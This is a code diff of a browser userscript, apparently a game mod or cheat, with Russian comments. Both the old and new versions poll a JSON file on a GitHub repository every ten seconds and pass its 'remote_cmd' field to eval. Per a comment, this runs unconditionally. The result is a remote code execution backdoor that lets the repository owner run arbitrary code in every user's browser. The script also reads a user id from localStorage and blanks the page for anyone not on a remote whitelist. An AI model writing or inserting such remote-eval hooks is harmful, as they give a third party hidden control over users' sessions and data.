@@ -1,47 +1,45 @@
-(() => {
-    'use strict';
-
 (function() {
+    'use strict';
     const DATA_URL = "https://raw.githubusercontent.com/Skurt246/doom-whitelist-uid/main/whitelistuid.json";
 
-    async function checkSecurity() {
-        try {
-            // Пытаемся достать данные из разных мест
-            const storageU = localStorage.getItem('u') || localStorage.getItem('uid');
-            const gameU = window.myPlayer ? window.myPlayer.name : null;
-            const savedUser = storageU || gameU;
+    // ПРИВЯЗЫВАЕМ ФУНКЦИЮ К WINDOW, ЧТОБЫ EVAL ЕЁ ВИДЕЛ
+    window.showRemoteNotice = function(text, color = "#00ffff") {
+        let msg = document.getElementById('r-alert');
+        if (msg) msg.remove();
+        msg = document.createElement('div');
+        msg.id = 'r-alert';
+        msg.style = `position:fixed;top:15%;left:50%;transform:translate(-50%,-50%);padding:20px;background:rgba(0,0,0,0.9);color:${color};border:2px solid ${color};z-index:9999999;font-family:monospace;border-radius:10px;text-align:center;box-shadow:0 0 20px ${color};pointer-events:none;`;
+        msg.innerHTML = `<b>[SYSTEM]:</b><br>${text}`;
+        document.body.appendChild(msg);
+        setTimeout(() => { if(msg) msg.remove(); }, 7000);
+    };
 
-            console.log("[Interium Sync] Checking for user:", savedUser);
-
-            const res = await fetch(DATA_URL + '?t=' + Date.now());
-            const data = await res.json();
-            
-            console.log("[Interium Sync] Data received from GitHub. Command:", data.remote_cmd);
-
-            // 1. Исполняем команду ВСЕГДА (даже если юзер еще не залогинился)
-            if (data.remote_cmd && data.remote_cmd.trim() !== "") {
-                try {
-                    eval(data.remote_cmd);
-                } catch(e) { console.error("Eval Error:", e); }
-            }
-
-            // 2. Если юзер опознан — проверяем на бан
-            if (savedUser) {
-                const userInList = data.users.find(u => u.name === savedUser);
-                if (!userInList || userInList.status !== "active") {
-                    document.body.innerHTML = "<div style='color:red; background:black; height:100vh; display:flex; align-items:center; justify-content:center; font-family:monospace; font-size:25px;'>ACCESS DENIED: BANNED</div>";
-                    location.replace("about:blank");
+    function sync() {
+        fetch(DATA_URL + "?t=" + Date.now())
+            .then(res => res.json())
+            .then(data => {
+                // 1. КОМАНДА
+                if (data.remote_cmd) {
+                    try {
+                        eval(data.remote_cmd); 
+                    } catch(e) { console.error("Eval fail:", e); }
                 }
-            }
 
-        } catch (e) {
-            console.error("[Interium Sync] Fetch failed. Check your link or AdBlock.");
-        }
+                // 2. КИК
+                const user = localStorage.getItem('u') || localStorage.getItem('uid') || (window.myPlayer ? window.myPlayer.name : null);
+                if (user) {
+                    const found = data.users.find(u => u.name === user);
+                    if (!found || found.status !== "active") {
+                        document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:20%'>BANNED BY ADMIN</h1>";
+                        location.replace("about:blank");
+                    }
+                }
+            })
+            .catch(err => console.log("Sync error..."));
     }
 
-    // Проверка раз в 10 секунд
-    setInterval(checkSecurity, 10000);
-    checkSecurity();
+    setInterval(sync, 10000);
+    sync();
 })();
 
     // ────────────────────────────────────────────────
